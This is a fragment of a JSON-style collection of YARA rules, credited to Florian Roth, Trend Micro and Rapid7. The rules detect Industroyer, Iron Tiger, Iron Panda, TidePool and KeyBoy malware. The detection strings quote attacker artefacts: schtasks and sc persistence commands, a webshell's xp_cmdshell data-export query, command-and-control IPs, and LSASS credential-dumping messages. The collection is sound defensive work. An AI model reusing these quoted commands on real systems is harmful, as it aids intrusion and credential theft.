  "Industroyer_Malware_1": "rule Industroyer_Malware_1 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n      hash1 = \"ad23c7930dae02de1ea3c6836091b5fb3c62a89bf2bcfb83b4b39ede15904910\"\n      hash2 = \"018eb62e174efdcdb3af011d34b0bf2284ed1a803718fba6edffe5bc0b446b81\"\n   strings:\n      $s1 = \"haslo.exe\" fullword ascii\n      $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\%ls\" fullword wide\n      $s3 = \"SYS_BASCON.COM\" fullword wide\n      $s4 = \"*.pcmt\" fullword wide\n      $s5 = \"*.pcmi\" fullword wide\n\n      $x1 = { 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73\n         00 5C 00 25 00 6C 00 73 00 00 00 49 00 6D 00 61\n         00 67 00 65 00 50 00 61 00 74 00 68 00 00 00 43\n         00 3A 00 5C 00 00 00 44 00 3A 00 5C 00 00 00 45\n         00 3A 00 5C 00 00 00 }\n      $x2 = \"haslo.dat\\x00Crash\"\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) or 2 of them )\n}",
  "Industroyer_Malware_2": "rule Industroyer_Malware_2 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n      hash1 = \"3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571\"\n      hash2 = \"37d54e3d5e8b838f366b9c202f75fa264611a12444e62ae759c31a0d041aa6e4\"\n      hash3 = \"ecaf150e087ddff0ec6463c92f7f6cca23cc4fd30fe34c10b3cb7c2a6d135c77\"\n      hash1 = \"6d707e647427f1ff4a7a9420188a8831f433ad8c5325dc8b8cc6fc5e7f1f6f47\"\n   strings:\n      $x1 = \"sc create %ls type= own start= auto error= ignore binpath= \\\"%ls\\\" displayname= \\\"%ls\\\"\" fullword wide\n      $x2 = \"10.15.1.69:3128\" fullword wide\n\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\" fullword wide\n      $s2 = \"/c sc stop %s\" fullword wide\n      $s3 = \"sc start %ls\" fullword wide\n      $s4 = \"93.115.27.57\" fullword wide\n      $s5 = \"5.39.218.152\" fullword wide\n      $s6 = \"tierexe\" fullword wide\n      $s7 = \"comsys\" fullword wide\n      $s8 = \"195.16.88.6\" fullword wide\n      $s9 = \"TieringService\" fullword wide\n\n      $a1 = \"TEMP\\x00\\x00DEF\" fullword wide\n      $a2 = \"TEMP\\x00\\x00DEF-C\" fullword wide\n      $a3 = \"TEMP\\x00\\x00DEF-WS\" fullword wide\n      $a4 = \"TEMP\\x00\\x00DEF-EP\" fullword wide\n      $a5 = \"TEMP\\x00\\x00DC-2-TEMP\" fullword wide\n      $a6 = \"TEMP\\x00\\x00DC-2\" fullword wide\n      $a7 = \"TEMP\\x00\\x00CES-McA-TEMP\" fullword wide\n      $a8 = \"TEMP\\x00\\x00SRV_WSUS\" fullword wide\n      $a9 = \"TEMP\\x00\\x00SRV_DC-2\" fullword wide\n      $a10 = \"TEMP\\x00\\x00SCE-WSUS01\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) or 3 of them or 1 of ($a*) ) or ( 5 of them )\n}",
  "Industroyer_Portscan_3": "rule Industroyer_Portscan_3 {\n   meta:\n      description = \"Detects Industroyer related custom port scaner\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n      hash1 = \"893e4cca7fe58191d2f6722b383b5e8009d3885b5913dcd2e3577e5a763cdb3f\"\n   strings:\n      $s1 = \"!ZBfamily\" fullword ascii\n      $s2 = \":g/outddomo;\" fullword ascii\n      $s3 = \"GHIJKLMNOTST\" fullword ascii\n      /* Decompressed File */\n      $d1 = \"Error params Arguments!!!\" fullword wide\n      $d2 = \"^(.+?.exe).*\\\\s+-ip\\\\s*=\\\\s*(.+)\\\\s+-ports\\\\s*=\\\\s*(.+)$\" fullword wide\n      $d3 = \"Exhample:App.exe -ip= 127.0.0.1-100,\" fullword wide\n      $d4 = \"Error IP Range %ls - %ls\" fullword wide\n      $d5 = \"Can't closesocket.\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) or 2 of ($d*) )\n}",
  "Industroyer_Portscan_3_Output": "rule Industroyer_Portscan_3_Output {\n   meta:\n      description = \"Detects Industroyer related custom port scaner output file\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n   strings:\n      $s1 = \"WSA library load complite.\" fullword ascii\n      $s2 = \"Connection refused\" fullword ascii\n   condition:\n      all of them\n}",
  "Industroyer_Malware_4": "rule Industroyer_Malware_4 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n      hash1 = \"21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561\"\n   strings:\n      $s1 = \"haslo.dat\" fullword wide\n      $s2 = \"defragsvc\" fullword ascii\n\n      /* .dat\\x00\\x00Crash */\n      $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of ($s*) or $a1 )\n}",
  "Industroyer_Malware_5": "rule Industroyer_Malware_5 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13\"\n      hash1 = \"7907dd95c1d36cf3dc842a1bd804f0db511a0f68f4b3d382c23a3c974a383cad\"\n   strings:\n      $x1 = \"D2MultiCommService.exe\" fullword ascii\n      $x2 = \"Crash104.dll\" fullword ascii\n      $x3 = \"iec104.log\" fullword ascii\n      $x4 = \"IEC-104 client: ip=%s; port=%s; ASDU=%u \" fullword ascii\n\n      $s1 = \"Error while getaddrinfo executing: %d\" fullword ascii\n      $s2 = \"return info-Remote command\" fullword ascii\n      $s3 = \"Error killing process ...\" fullword ascii\n      $s4 = \"stop_comm_service_name\" fullword ascii\n      $s5 = \"*1* Data exchange: Send: %d (%s)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and ( 1 of ($x*) or 4 of them ) ) or ( all of them )\n}",
  "IronTiger_ASPXSpy": "rule IronTiger_ASPXSpy\n{\n    \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"ASPXSpy detection. It might be used by other fraudsters\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"ASPXSpy\" nocase wide ascii\n        $str2 = \"IIS Spy\" nocase wide ascii\n        $str3 = \"protected void DGCoW(object sender,EventArgs e)\" nocase wide ascii\n    \n    condition:\n        any of ($str*)\n}",
  "IronTiger_ChangePort_Toolkit_driversinstall": "rule IronTiger_ChangePort_Toolkit_driversinstall \n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - Changeport Toolkit driverinstall\"   \n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"openmydoor\" nocase wide ascii\n        $str2 = \"Install service error\" nocase wide ascii\n        $str3 = \"start remove service\" nocase wide ascii\n        $str4 = \"NdisVersion\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}",
  "IronTiger_ChangePort_Toolkit_ChangePortExe": "rule IronTiger_ChangePort_Toolkit_ChangePortExe \n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - Toolkit ChangePort\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"Unable to alloc the adapter!\" nocase wide ascii\n        $str2 = \"Wait for master fuck\" nocase wide ascii\n        $str3 = \"xx.exe <HOST> <PORT>\" nocase wide ascii\n        $str4 = \"chkroot2007\" nocase wide ascii\n        $str5 = \"Door is bind on %s\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}",
  "IronTiger_dllshellexc2010": "rule IronTiger_dllshellexc2010 \n{\n    \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"dllshellexc2010 Exchange backdoor + remote shell\"\n        reference = \"http://goo.gl/T5fSJC\"\n    \n    strings:\n        $str1 = \"Microsoft.Exchange.Clients.Auth.dll\" nocase ascii wide\n        $str2 = \"Dllshellexc2010\" nocase wide ascii\n        $str3 = \"Users\\\\ljw\\\\Documents\" nocase wide ascii\n        $bla1 = \"please input path\" nocase wide ascii\n        $bla2 = \"auth.owa\" nocase wide ascii\n    \n    condition:\n        (uint16(0) == 0x5a4d) and ((any of ($str*)) or (all of ($bla*)))\n}",
  "IronTiger_dnstunnel": "rule IronTiger_dnstunnel \n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"This rule detects a dns tunnel tool used in Operation Iron Tiger\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"\\\\DnsTunClient\\\\\" nocase wide ascii\n        $str2 = \"\\\\t-DNSTunnel\\\\\" nocase wide ascii\n        $str3 = \"xssok.blogspot\" nocase wide ascii\n        $str4 = \"dnstunclient\" nocase wide ascii\n        $mistake1 = \"because of error, can not analysis\" nocase wide ascii\n        $mistake2 = \"can not deal witn the error\" nocase wide ascii\n        $mistake3 = \"the other retun one RST\" nocase wide ascii\n        $mistake4 = \"Coversation produce one error\" nocase wide ascii\n        $mistake5 = \"Program try to use the have deleted the buffer\" nocase wide ascii\n    \n    condition:\n        (uint16(0) == 0x5a4d) and ((any of ($str*)) or (any of ($mistake*)))\n}",
  "IronTiger_EFH3_encoder": "rule IronTiger_EFH3_encoder \n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger EFH3 Encoder\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"EFH3 [HEX] [SRCFILE] [DSTFILE]\" nocase wide ascii\n        $str2 = \"123.EXE 123.EFH\" nocase wide ascii\n        $str3 = \"ENCODER: b[i]: = \" nocase wide ascii\n  \n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}",
  "IronTiger_GetPassword_x64": "rule IronTiger_GetPassword_x64\n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - GetPassword x64\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"(LUID ERROR)\" nocase wide ascii\n        $str2 = \"Users\\\\K8team\\\\Desktop\\\\GetPassword\" nocase wide ascii\n        $str3 = \"Debug x64\\\\GetPassword.pdb\" nocase wide ascii\n        $bla1 = \"Authentication Package:\" nocase wide ascii\n        $bla2 = \"Authentication Domain:\" nocase wide ascii\n        $bla3 = \"* Password:\" nocase wide ascii\n        $bla4 = \"Primary User:\" nocase wide ascii\n  \n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}",
  "IronTiger_GetUserInfo": "rule IronTiger_GetUserInfo\n{\n    \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - GetUserInfo\"\n        reference = \"http://goo.gl/T5fSJC\"\n    \n    strings:\n        $str1 = \"getuserinfo username\" nocase wide ascii\n        $str2 = \"joe@joeware.net\" nocase wide ascii\n        $str3 = \"If . specified for userid,\" nocase wide ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}",
  "IronTiger_Gh0stRAT_variant": "rule IronTiger_Gh0stRAT_variant\n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"This is a detection for a s.exe variant seen in Op. Iron Tiger\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"Game Over Good Luck By Wind\" nocase wide ascii\n        $str2 = \"ReleiceName\" nocase wide ascii\n        $str3 = \"jingtisanmenxiachuanxiao.vbs\" nocase wide ascii\n        $str4 = \"Winds Update\" nocase wide ascii\n  \n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}",
  "IronTiger_GTalk_Trojan": "rule IronTiger_GTalk_Trojan \n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - GTalk Trojan\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"gtalklite.com\" nocase wide ascii\n        $str2 = \"computer=%s&lanip=%s&uid=%s&os=%s&data=%s\" nocase wide ascii\n        $str3 = \"D13idmAdm\" nocase wide ascii\n        $str4 = \"Error: PeekNamedPipe failed with %i\" nocase wide ascii\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}",
  "IronTiger_HTTPBrowser_Dropper": "rule IronTiger_HTTPBrowser_Dropper \n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - HTTPBrowser Dropper\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \".dllUT\" nocase wide ascii\n        $str2 = \".exeUT\" nocase wide ascii\n        $str3 = \".urlUT\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}",
  "IronTiger_HTTP_SOCKS_Proxy_soexe": "rule IronTiger_HTTP_SOCKS_Proxy_soexe\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Toolset - HTTP SOCKS Proxy soexe\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"listen SOCKET error.\" nocase wide ascii\n        $str2 = \"WSAAsyncSelect SOCKET error.\" nocase wide ascii\n        $str3 = \"new SOCKETINFO error!\" nocase wide ascii\n        $str4 = \"Http/1.1 403 Forbidden\" nocase wide ascii\n        $str5 = \"Create SOCKET error.\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (3 of ($str*))\n}",
  "IronTiger_NBDDos_Gh0stvariant_dropper": "rule IronTiger_NBDDos_Gh0stvariant_dropper\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - NBDDos Gh0stvariant Dropper\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"This service can't be stoped.\" nocase wide ascii\n        $str2 = \"Provides support for media palyer\" nocase wide ascii\n        $str4 = \"CreaetProcess Error\" nocase wide ascii\n        $bla1 = \"Kill You\" nocase wide ascii\n        $bla2 = \"%4.2f GB\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}",
  "IronTiger_PlugX_DosEmulator": "rule IronTiger_PlugX_DosEmulator\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - PlugX DosEmulator\"  \n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"Dos Emluator Ver\" nocase wide ascii\n        $str2 = \"\\\\PIPE\\\\FASTDOS\" nocase wide ascii\n        $str3 = \"FastDos.cpp\" nocase wide ascii\n        $str4 = \"fail,error code = %d.\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}",
  "IronTiger_PlugX_FastProxy": "rule IronTiger_PlugX_FastProxy\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - PlugX FastProxy\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"SAFEPROXY HTServerTimer Quit!\" nocase wide ascii\n        $str2 = \"Useage: %s pid\" nocase wide ascii\n        $str3 = \"%s PORT[%d] TO PORT[%d] SUCCESS!\" nocase wide ascii\n        $str4 = \"p0: port for listener\" nocase wide ascii\n        $str5 = \"\\\\users\\\\whg\\\\desktop\\\\plug\\\\\" nocase wide ascii\n        $str6 = \"[+Y] cwnd : %3d, fligth:\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}",
  "IronTiger_PlugX_Server": "rule IronTiger_PlugX_Server\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - PlugX Server\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"\\\\UnitFrmManagerKeyLog.pas\" nocase wide ascii\n        $str2 = \"\\\\UnitFrmManagerRegister.pas\" nocase wide ascii\n        $str3 = \"Input Name...\" nocase wide ascii\n        $str4 = \"New Value#\" nocase wide ascii\n        $str5 = \"TThreadRControl.Execute SEH!!!\" nocase wide ascii\n        $str6 = \"\\\\UnitFrmRControl.pas\" nocase wide ascii\n        $str7 = \"OnSocket(event is error)!\" nocase wide ascii\n        $str8 = \"Make 3F Version Ok!!!\" nocase wide ascii\n        $str9 = \"PELEASE DO NOT CHANGE THE DOCAMENT\" nocase wide ascii\n        $str10 = \"Press [Ok] Continue Run, Press [Cancel] Exit\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}",
  "IronTiger_ReadPWD86": "rule IronTiger_ReadPWD86\n{\n   \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - ReadPWD86\"\n        reference = \"http://goo.gl/T5fSJC\"\n   \n    strings:\n        $str1 = \"Fail To Load LSASRV\" nocase wide ascii\n        $str2 = \"Fail To Search LSASS Data\" nocase wide ascii\n        $str3 = \"User Principal\" nocase wide ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and (all of ($str*))\n}",
  "IronTiger_Ring_Gh0stvariant": "rule IronTiger_Ring_Gh0stvariant\n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Malware - Ring Gh0stvariant\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"RING RAT Exception\" nocase wide ascii\n        $str2 = \"(can not update server recently)!\" nocase wide ascii\n        $str4 = \"CreaetProcess Error\" nocase wide ascii\n        $bla1 = \"Sucess!\" nocase wide ascii\n        $bla2 = \"user canceled!\" nocase wide ascii\n  \n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}",
  "IronTiger_wmiexec": "rule IronTiger_wmiexec\n{\n  \n    meta:\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        description = \"Iron Tiger Tool - wmi.vbs detection\"\n        reference = \"http://goo.gl/T5fSJC\"\n  \n    strings:\n        $str1 = \"Temp Result File , Change it to where you like\" nocase wide ascii\n        $str2 = \"wmiexec\" nocase wide ascii\n        $str3 = \"By. Twi1ight\" nocase wide ascii\n        $str4 = \"[both mode] ,delay TIME to read result\" nocase wide ascii\n        $str5 = \"such as nc.exe or Trojan\" nocase wide ascii\n        $str6 = \"+++shell mode+++\" nocase wide ascii\n        $str7 = \"win2008 fso has no privilege to delete file\" nocase wide ascii\n  \n    condition:\n        2 of ($str*)\n}",
  "IronPanda_DNSTunClient": "rule IronPanda_DNSTunClient \n{\n\n    meta:\n        description = \"Iron Panda malware DnsTunClient - file named.exe\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        score = 80\n        hash = \"a08db49e198068709b7e52f16d00a10d72b4d26562c0d82b4544f8b0fb259431\"\n\n    strings:\n        $s1 = \"dnstunclient -d or -domain <domain>\" fullword ascii\n        $s2 = \"dnstunclient -ip <server ip address>\" fullword ascii\n        $s3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\Microsoft Windows\\\" /tr \" fullword ascii\n        $s4 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"Microsoft Windows\\\" /tr \" fullword ascii\n        $s5 = \"taskkill /im conime.exe\" fullword ascii\n        $s6 = \"\\\\dns control\\\\t-DNSTunnel\\\\DnsTunClient\\\\DnsTunClient.cpp\" fullword ascii\n        $s7 = \"UDP error:can not bing the port(if there is unclosed the bind process?)\" fullword ascii\n        $s8 = \"use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)\" fullword ascii\n        $s9 = \"error: packet num error.the connection have condurt,pls try later\" fullword ascii\n        $s10 = \"Coversation produce one error:%s,coversation fail\" fullword ascii\n        $s11 = \"try to add many same pipe to select group(or mark is too easy).\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 400KB and 2 of them ) or 5 of them\n}",
  "IronPanda_Malware1": "rule IronPanda_Malware1 \n{\n\n    meta:\n        description = \"Iron Panda Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"a0cee5822ddf254c254a5a0b7372c9d2b46b088a254a1208cb32f5fe7eca848a\"\n\n    strings:\n        $x1 = \"activedsimp.dll\" fullword wide\n        $s1 = \"get_BadLoginAddress\" fullword ascii\n        $s2 = \"get_LastFailedLogin\" fullword ascii\n        $s3 = \"ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED\" fullword ascii\n        $s4 = \"get_PasswordExpirationDate\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "IronPanda_Webshell_JSP": "rule IronPanda_Webshell_JSP \n{\n\n    meta:\n        description = \"Iron Panda Malware JSP\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"3be95477e1d9f3877b4355cff3fbcdd3589bb7f6349fd4ba6451e1e9d32b7fa6\"\n  \n    strings:\n        $s1 = \"Bin_ExecSql(\\\"exec master..xp_cmdshell'bcp \\\\\\\"select safile from \\\" + db + \\\"..bin_temp\\\\\\\" queryout \\\\\\\"\\\" + Bin_TextBox_SaveP\" ascii\n        $s2 = \"tc.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('zcg_ClosePM','\\\"+Bin_ToBase64(de.Key.ToString())+\\\"')\\\\\\\">Close</a>\\\";\" fullword ascii\n        $s3 = \"Bin_ExecSql(\\\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\\\");\" fullword ascii\n  \n    condition:\n        filesize < 330KB and 1 of them\n}",
  "IronPanda_Malware_Htran": "rule IronPanda_Malware_Htran \n{\n\n    meta:\n        description = \"Iron Panda Malware Htran\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"7903f94730a8508e9b272b3b56899b49736740cea5037ea7dbb4e690bcaf00e7\"\n   \n    strings:\n        $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n        $s2 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n        $s3 = \"-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s4 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n        $s5 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s6 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n        $s7 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n        $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n        $s9 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n        $s10 = \"cmshared_get_ptr_from_atom\" fullword ascii\n        $s11 = \"_cmshared_get_ptr_from_atom\" fullword ascii\n        $s12 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n        $s13 = \"[-] TransmitPort invalid.\" fullword ascii\n        $s14 = \"[+] Waiting for Client on port:%d ......\" fullword ascii\n   \n    condition:\n         ( uint16(0) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them\n}",
  "IronPanda_Malware2": "rule IronPanda_Malware2 \n{\n\n    meta:\n        description = \"Iron Panda Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91\"\n\n    strings:\n        $s0 = \"\\\\setup.exe\" fullword ascii\n        $s1 = \"msi.dll.urlUT\" fullword ascii\n        $s2 = \"msi.dllUT\" fullword ascii\n        $s3 = \"setup.exeUT\" fullword ascii\n        $s4 = \"/c del /q %s\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 180KB and all of them\n}",
  "IronPanda_Malware3": "rule IronPanda_Malware3 \n{\n\n    meta:\n        description = \"Iron Panda Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"5cd2af844e718570ae7ba9773a9075738c0b3b75c65909437c43201ce596a742\"\n\n    strings:\n        $s0 = \"PluginDeflater.exe\" fullword wide\n        $s1 = \".Deflated\" fullword wide\n        $s2 = \"PluginDeflater\" fullword ascii\n        $s3 = \"DeflateStream\" fullword ascii /* Goodware String - occured 1 times */\n        $s4 = \"CompressionMode\" fullword ascii /* Goodware String - occured 4 times */\n        $s5 = \"System.IO.Compression\" fullword ascii /* Goodware String - occured 6 times */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 10KB and all of them\n}",
  "IronPanda_Malware4": "rule IronPanda_Malware4 \n{\n\n    meta:\n        description = \"Iron Panda Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/E4qia9\"\n        date = \"2015-09-16\"\n        hash = \"0d6da946026154416f49df2283252d01ecfb0c41c27ef3bc79029483adc2240c\"\n\n    strings:\n        $s0 = \"TestPlugin.dll\" fullword wide\n        $s1 = \"<a href='http://www.baidu.com'>aasd</a>\" fullword wide\n        $s2 = \"Zcg.Test.AspxSpyPlugins\" fullword ascii\n        $s6 = \"TestPlugin\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 10KB and all of them\n}",
  "rtf_Kaba_jDoe": "",
  "TidePool_Malware": "rule TidePool_Malware\n{\n\n    meta:\n        description = \"Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/m2CXWR\"\n        date = \"2016-05-24\"\n        hash1 = \"9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba\"\n        hash2 = \"67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed\"\n        hash3 = \"2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\"\n        hash4 = \"38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f\"\n        hash5 = \"9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba\"\n\n    strings:\n        $x1 = \"Content-Disposition: form-data; name=\\\"m1.jpg\\\"\" fullword ascii\n        $x2 = \"C:\\\\PROGRA~2\\\\IEHelper\\\\mshtml.dll\" fullword wide\n        $x3 = \"C:\\\\DOCUME~1\\\\ALLUSE~1\\\\IEHelper\\\\mshtml.dll\" fullword wide\n        $x4 = \"IEComDll.dat\" fullword ascii\n        $s1 = \"Content-Type: multipart/form-data; boundary=----=_Part_%x\" fullword wide\n        $s2 = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n        $s3 = \"network.proxy.socks_port\\\", \" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) ) ) or ( 4 of them )\n}",
  "KeyBoy_Dropper": "rule KeyBoy_Dropper\n{\n\n    meta:\n        Author      = \"Rapid7 Labs\"\n        Date        = \"2013/06/07\"\n        Description = \"Strings inside\"\n        Reference   = \"https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\n\n    strings:\n        $1 = \"I am Admin\"\n        $2 = \"I am User\"\n        $3 = \"Run install success!\"\n        $4 = \"Service install success!\"\n        $5 = \"Something Error!\"\n        $6 = \"Not Configed, Exiting\"\n\n    condition:\n        all of them\n}",
  "KeyBoy_Backdoor": "rule KeyBoy_Backdoor\n{\n\n    meta:\n        Author      = \"Rapid7 Labs\"\n        Date        = \"2013/06/07\"\n        Description = \"Strings inside\"\n        Reference   = \"https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india\"\n\n    strings:\n        $1 = \"$login$\"\n        $2 = \"$sysinfo$\"\n        $3 = \"$shell$\"\n        $4 = \"$fileManager$\"\n        $5 = \"$fileDownload$\"\n        $6 = \"$fileUpload$\"\n\n    condition:\n        all of them\n}",
  "new_keyboy_export": "rule new_keyboy_export\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the new 2016 sample's export\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    condition:\n        //MZ header //PE signature //The malware family seems to share many exports //but this is the new kid on the block.\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and pe.exports(\"cfsUpdate\")\n}",
